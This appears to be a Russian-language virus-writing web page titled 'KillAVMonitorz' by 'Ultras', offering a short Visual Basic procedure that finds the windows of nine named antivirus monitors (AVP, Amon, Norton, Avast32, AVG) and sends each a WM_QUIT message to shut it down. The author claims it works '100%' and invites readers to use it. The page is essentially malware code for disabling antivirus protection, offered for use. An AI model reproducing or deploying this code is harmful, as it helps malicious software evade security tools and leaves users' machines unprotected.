<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<base target="_self">
</head>

<body topmargin="0" leftmargin="0" bgcolor="#E7BE7B" link="#CC0000" vlink="#993300" alink="#FF9900">

<Table border="0" cellPadding="0" cellSpacing="0" width="100%">
        <Tr>
                <Td valign="top" height="33">
                        <Img src="../images/index_08.gif" width="6" height="33"></Td>
                <Td width="100%" background="../images/index_09.gif" valign="top" height="33">
            <img border="0" src="../images/kolesiko.gif" align="absmiddle" width="21" height="33"><font face="Arial" size="2"><b>
KillAVMonitorz            
            </b> - 09:12 - <i>by Ultras</i></font>
            </font></Td>
                <Td valign="top" height="33">
                        <Img src="../images/index_10.gif" width="10" height="33"></Td>
     </Tr>
     <Tr>
                <Td background="../images/index_17.gif">
            &nbsp;</Td>
                <Td width="100%" bgcolor="#E7BE7B">
            <font face="Courier" size="3">
<pre>
 Решил написать я маленькую процедуру на vb, которая бы убивала av мониторы в памяти.
Все получилось и она работает 100%. Я написал 2 версий этой процедуры одна убивала av
через SendMessageA, а другая через PostMessageA. Но решил все таки опубликовать метод
через PostMessageA он меньше. Юзайте......



' win32 api которые нужны будкт в этой процедуре.

Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
    (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
    
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" _
    (ByVal lpClassName As String, ByVal lpWindowName As String) As Long   
    
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" _
    (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long

' константа выхода

Const WM_QUIT = &H10

' процедура уничтожения av мониторов и сканеров в памяти.

Sub az()

' список из 9 мониторов которые мы хотим удалить из памяти.

For c = 1 To 9
If c = 1 Then av$ = "AVP Monitor"
If c = 2 Then av$ = "Amon Antivirus Monitor"
If c = 3 Then av$ = "Norton AntiVirus"
If c = 4 Then av$ = "AVP Монитор"
If c = 5 Then av$ = "Antivэrusov¤ monitor Amon"
If c = 6 Then av$ = "Amon Antivirus Monitor"
If c = 7 Then av$ = "Avast32 -- Rezidentnэ podpora"
If c = 8 Then av$ = "AVG Control Center"
If c = 9 Then av$ = "AVP Office Guard"

' поиск окна с выше перечисленным именем

hW = FindWindow(vbNullString, av$ & Chr(0))

' киляем монитор

z = PostMessage(hW, WM_QUIT, 0, 0)

' продолжим цикл

Next c

' конец

End Sub


Вот и все...
 </pre>
</font>
</Td>
                <Td background="../images/index_19.gif">
            &nbsp;</Td>
        </Tr>
        <Tr>
                <Td>
                        <Img src="../images/index_44.gif" width="6" height="9"></Td>
                <Td background="../images/index_45.gif" height="9">
            <img border="0" src="../images/spacer.gif" width="9" height="9"></Td>
                <Td>
                        <Img src="../images/index_46.gif" width="10" height="9"></Td>
        </Tr>
</Table>
<br>

</Table>
&nbsp;

</body>

</html>
